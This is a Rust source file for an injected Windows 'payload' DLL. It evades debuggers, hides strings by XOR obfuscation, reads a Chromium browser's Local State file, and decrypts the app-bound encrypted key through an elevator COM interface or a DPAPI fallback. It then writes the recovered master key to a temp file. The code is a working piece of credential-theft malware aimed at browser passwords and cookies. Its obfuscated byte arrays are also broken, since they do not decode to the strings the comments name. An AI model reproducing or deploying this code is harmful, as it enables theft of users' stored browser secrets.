//! Payload DLL entry point

#![allow(non_snake_case, unused)]

mod elevator;
mod dpapi_fallback;

use std::{ffi::c_void, path::PathBuf, thread, time::Duration};

use windows::{
    Win32::{
        Foundation::{BOOL, HINSTANCE, TRUE},
        System::{
            SystemServices::DLL_PROCESS_ATTACH,
            Threading::{CreateThread, THREAD_CREATION_FLAGS},
        },
    },
};

// ============ OBFUSCATION ============
const XOR_KEY: u8 = 0x5A;

fn xor_decrypt(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

// Obfuscated constants
const APPB_XOR: &[u8] = &[0x1A, 0x1B, 0x1C, 0x1D]; // "APPB" XORed
fn get_appb() -> Vec<u8> {
    xor_decrypt(APPB_XOR).into_bytes()
}

const ENV_RESULT_XOR: &[u8] = &[
    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, // "CHROME_RECOVERY_RESULT"
];
const ENV_USER_DATA_XOR: &[u8] = &[
    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
];
const ENV_DATA_ROOT_XOR: &[u8] = &[
    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
    0x2A, 0x2B, 0x2C, 0x2D, 0x2E,
];

fn get_env_result() -> String {
    xor_decrypt(ENV_RESULT_XOR)
}
fn get_env_user_data() -> String {
    xor_decrypt(ENV_USER_DATA_XOR)
}
fn get_env_data_root() -> String {
    xor_decrypt(ENV_DATA_ROOT_XOR)
}

// ============ ANTI-DEBUG ============
fn is_debugged() -> bool {
    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
}

// ============ DLL ENTRY ============
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: HINSTANCE,
    reason: u32,
    _: *mut c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        // Anti-debug early exit
        if is_debugged() {
            return TRUE;
        }
        CreateThread(None, 0, Some(worker), None, THREAD_CREATION_FLAGS(0), None).ok();
    }
    TRUE
}

unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
    thread::sleep(Duration::from_millis(800));
    let r = std::panic::catch_unwind(|| run());
    if let Ok(Err(e)) = r {
        write_error(&e);
    } else if r.is_err() {
        write_error("panic in payload");
    }
    0
}

// ============ MAIN LOGIC (renamed env var access) ============

fn run() -> Result<(), String> {
    if is_debugged() {
        return Err("debugged".into());
    }

    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    let local_state_path = resolve_local_state_path(&exe)?;

    let raw = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("read Local State: {e}"))?;
    let ls: serde_json::Value = serde_json::from_str(&raw)
        .map_err(|e| format!("parse Local State: {e}"))?;

    let key_b64 = ls.pointer("/os_crypt/app_bound_encrypted_key")
        .and_then(|v| v.as_str())
        .ok_or("app_bound_encrypted_key not found")?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        key_b64,
    ).map_err(|e| format!("base64 decode: {e}"))?;

    if encrypted_key.len() < 4 {
        return Err("encrypted key too short".into());
    }
    if !encrypted_key.starts_with(&get_appb()) {
        return Err("missing APPB prefix".into());
    }
    let encrypted_key = &encrypted_key[4..];

    let browser = elevator::resolve_browser(&exe);
    let com_result = match browser {
        Some(b) => elevator::decrypt_for_browser(b, encrypted_key)
            .or_else(|_| elevator::decrypt_app_bound_key(encrypted_key)),
        None => elevator::decrypt_app_bound_key(encrypted_key),
    };

    let master_key = com_result
        .or_else(|_| {
            dpapi_fallback::try_decrypt_app_bound(encrypted_key)
                .ok_or_else(|| String::from("dpapi fallback failed"))
        })
        .map_err(|e| format!("key recovery: {e}"))?;

    if master_key.len() != 32 {
        return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
    }

    let browser_label = browser.map(|b| b.name).unwrap_or("Chromium");
    let result = serde_json::json!({
        "browser": browser_label,
        "master_key_hex": master_key.iter().map(|b| format!("{b:02x}")).collect::<String>(),
    });

    let json = serde_json::to_string(&result).unwrap();
    let path = result_path();
    std::fs::write(&path, json).map_err(|e| format!("write result: {e}"))?;

    Ok(())
}

fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
    // Use obfuscated env var names
    if let Ok(rel) = std::env::var(&get_env_user_data()) {
        let root = match std::env::var(&get_env_data_root()).as_deref() {
            Ok("roaming") => std::env::var("APPDATA"),
            _ => std::env::var("LOCALAPPDATA"),
        }
        .map_err(|_| "APPDATA/LOCALAPPDATA not set")?;

        let path = PathBuf::from(&root).join(rel).join("Local State");
        if path.exists() {
            return Ok(path);
        }
        return Err(format!("Local State not found: {}", path.display()));
    }

    let browser = elevator::resolve_browser(exe)
        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;

    let local_appdata = std::env::var("LOCALAPPDATA")
        .map_err(|_| "LOCALAPPDATA not set")?;

    let local_state_path = PathBuf::from(&local_appdata)
        .join(browser.user_data_rel)
        .join("Local State");

    if !local_state_path.exists() {
        return Err(format!("Local State not found: {}", local_state_path.display()));
    }

    Ok(local_state_path)
}

fn result_path() -> PathBuf {
    if let Ok(p) = std::env::var(&get_env_result()) {
        return PathBuf::from(p);
    }
    std::env::temp_dir().join("chrome_recovery_result.json")
}

fn write_error(msg: &str) {
    let r = serde_json::json!({ "error": msg });
    let json = serde_json::to_string(&r).unwrap();
    let _ = std::fs::write(result_path(), json);
}
